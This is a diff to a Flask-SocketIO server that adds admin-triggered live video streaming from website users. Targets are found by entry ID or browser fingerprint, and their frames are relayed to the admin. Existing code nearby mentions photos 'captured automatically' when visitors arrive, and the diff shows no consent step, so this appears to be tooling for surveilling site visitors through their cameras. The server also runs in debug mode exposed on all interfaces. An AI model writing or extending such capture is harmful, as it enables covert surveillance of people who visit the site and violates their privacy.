@@ -1597,6 +1597,8 @@ def serve_photo(filename):
 active_users = {}
 # Store pending photo requests: {entry_id: [request_data, ...]}
 pending_photo_requests = {}
+# Store active stream sessions: {entry_id: {'admin_socket_id': socket_id, 'user_socket_id': socket_id}}
+active_streams = {}
 
 @socketio.on('connect')
 def handle_connect():
@@ -1626,11 +1628,24 @@ def handle_disconnect():
             del active_users[entry_id]
             logger.debug(f"Removed user entry {entry_id}")
             
+            # Clean up active streams if user disconnects
+            if entry_id in active_streams:
+                del active_streams[entry_id]
+                logger.debug(f"Cleaned up stream for entry {entry_id}")
+            
             # Broadcast user status update to admin dashboard
             emit('user_status_update', {
                 'entry_id': entry_id,
                 'is_online': False
             }, broadcast=True, include_self=False)
+    
+    # Clean up streams where admin disconnected
+    for entry_id, stream_info in list(active_streams.items()):
+        if stream_info.get('admin_socket_id') == request.sid:
+            # Notify user to stop streaming
+            emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
+            del active_streams[entry_id]
+            logger.debug(f"Cleaned up stream for entry {entry_id} (admin disconnected)")
 
 @socketio.on('register_user')
 def handle_register_user(data):
@@ -1752,6 +1767,98 @@ def handle_request_photo(data):
                 'error': error_msg,
                 'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
             })
+
+@socketio.on('request_stream')
+def handle_request_stream(data):
+    """Admin requests a live stream from a specific user"""
+    entry_id = data.get('entry_id')
+    fingerprint = data.get('fingerprint', '')
+    
+    if not entry_id and not fingerprint:
+        emit('stream_request_error', {'error': 'Entry ID or fingerprint required'})
+        return
+    
+    # Find user by entry_id or fingerprint
+    target_socket_id = None
+    target_entry_id = None
+    
+    if entry_id and entry_id in active_users:
+        target_socket_id = active_users[entry_id]['socket_id']
+        target_entry_id = entry_id
+    elif fingerprint:
+        # Search by fingerprint
+        for eid, user_info in active_users.items():
+            if user_info.get('fingerprint') == fingerprint:
+                target_socket_id = user_info['socket_id']
+                target_entry_id = eid
+                break
+    
+    if target_socket_id and target_entry_id:
+        # User is online - send stream request
+        request_data = {
+            'entry_id': target_entry_id,
+            'fingerprint': fingerprint,
+            'requested_at': datetime.now().isoformat()
+        }
+        emit('stream_request', request_data, room=f'user_{target_entry_id}')
+        
+        # Store stream session
+        active_streams[target_entry_id] = {
+            'admin_socket_id': request.sid,
+            'user_socket_id': target_socket_id,
+            'started_at': datetime.now().isoformat()
+        }
+        
+        logger.debug(f"Stream request sent to entry {target_entry_id}")
+        emit('stream_requested', {
+            'entry_id': target_entry_id,
+            'status': 'started',
+            'message': 'Stream request sent to user'
+        })
+    else:
+        # User not online
+        error_msg = f"User not online (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+        logger.warning(error_msg)
+        emit('stream_request_error', {
+            'error': error_msg,
+            'suggestion': 'The user must be online to start a live stream.'
+        })
+
+@socketio.on('stop_stream')
+def handle_stop_stream(data):
+    """Admin stops a live stream"""
+    entry_id = data.get('entry_id')
+    
+    if entry_id and entry_id in active_streams:
+        # Notify user to stop streaming
+        emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
+        
+        # Remove stream session
+        del active_streams[entry_id]
+        
+        emit('stream_stopped', {
+            'entry_id': entry_id,
+            'status': 'stopped',
+            'message': 'Stream stopped'
+        })
+        logger.debug(f"Stream stopped for entry {entry_id}")
+    else:
+        emit('stream_request_error', {'error': 'No active stream found'})
+
+@socketio.on('stream_frame')
+def handle_stream_frame(data):
+    """Receive video frame from user and forward to admin"""
+    entry_id = data.get('entry_id')
+    frame_data = data.get('frame_data')  # Base64 encoded frame
+    
+    if entry_id and entry_id in active_streams:
+        # Forward frame to admin
+        admin_socket_id = active_streams[entry_id]['admin_socket_id']
+        emit('stream_frame', {
+            'entry_id': entry_id,
+            'frame_data': frame_data,
+            'timestamp': datetime.now().isoformat()
+        }, to=admin_socket_id)
 
 if __name__ == '__main__':
     socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
